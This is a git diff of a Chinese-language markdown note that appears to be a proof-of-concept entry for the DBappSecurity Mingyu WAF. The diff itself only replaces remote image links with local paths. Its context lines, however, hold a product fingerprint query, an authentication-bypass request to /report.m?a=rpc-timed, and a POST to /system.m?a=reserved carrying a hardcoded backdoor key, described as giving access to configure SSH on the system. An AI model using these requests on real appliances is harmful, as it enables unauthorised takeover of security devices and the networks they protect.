@@ -20,7 +20,7 @@ app="安恒信息-明御WAF"
 
 登录页面
 
-![image-20220824142132930](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241421007.png)
+![image-20220824142132930](./images/202208241421007.png)
 
 验证POC
 
@@ -28,11 +28,11 @@ app="安恒信息-明御WAF"
 /report.m?a=rpc-timed
 ```
 
-![image-20220824142150382](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241421426.png)
+![image-20220824142150382](./images/202208241421426.png)
 
 再访问主页面跳转配置页面
 
-![image-20220824142208002](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241422055.png)
+![image-20220824142208002](./images/202208241422055.png)
 
 发送请求包配置系统SSH等
 
@@ -42,4 +42,4 @@ POST /system.m?a=reserved
 key=!@#dbapp-waf-dev-reserved#@!
 ```
 
-![image-20220824142219609](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241422661.png)
+![image-20220824142219609](./images/202208241422661.png)
